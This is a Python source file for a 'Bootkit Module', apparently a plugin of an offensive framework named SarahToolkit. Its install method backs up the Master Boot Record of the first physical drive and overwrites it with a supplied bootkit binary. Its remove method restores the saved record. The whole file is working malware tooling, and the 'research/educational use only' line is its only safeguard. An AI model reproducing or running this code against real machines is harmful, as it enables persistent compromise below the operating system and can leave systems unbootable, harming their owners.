"""
Bootkit Module for SarahToolkit (Enhanced)
Performs MBR backup, bootkit installation, and removal (for research/educational use only).
"""
import os
import shutil
import logging

class BootkitModule:
    def __init__(self, config=None):
        self.config = config or {}
        self.bootkit_path = self.config.get('bootkit_path', 'bootkit.bin')
        self.backup_path = self.config.get('backup_path', 'mbr_backup.bin')
        self.sector_size = 512

    def install(self, target_drive=r"\\.\PhysicalDrive0"):
        """
        Installs the bootkit by overwriting the MBR of the target drive.
        Backs up the original MBR before writing.
        """
        try:
            if not os.path.exists(self.bootkit_path):
                print(f"[BootkitModule] Bootkit binary not found: {self.bootkit_path}")
                return False
            with open(self.bootkit_path, 'rb') as bk_file:
                bootkit_data = bk_file.read(self.sector_size)
            with open(target_drive, 'rb+') as drive:
                original_mbr = drive.read(self.sector_size)
                # Backup original MBR
                with open(self.backup_path, 'wb') as backup_file:
                    backup_file.write(original_mbr)
                drive.seek(0)
                drive.write(bootkit_data)
            print(f"[BootkitModule] Bootkit installed and original MBR backed up to {self.backup_path}")
            return True
        except Exception as e:
            logging.error(f"[BootkitModule] Install failed: {e}")
            return False

    def remove(self, target_drive=r"\\.\PhysicalDrive0"):
        """
        Restores the original MBR from backup.
        """
        try:
            if not os.path.exists(self.backup_path):
                print(f"[BootkitModule] No MBR backup found at {self.backup_path}")
                return False
            with open(self.backup_path, 'rb') as backup_file:
                original_mbr = backup_file.read(self.sector_size)
            with open(target_drive, 'rb+') as drive:
                drive.seek(0)
                drive.write(original_mbr)
            print(f"[BootkitModule] Original MBR restored from {self.backup_path}")
            return True
        except Exception as e:
            logging.error(f"[BootkitModule] Remove failed: {e}")
            return False

def register():
    return BootkitModule
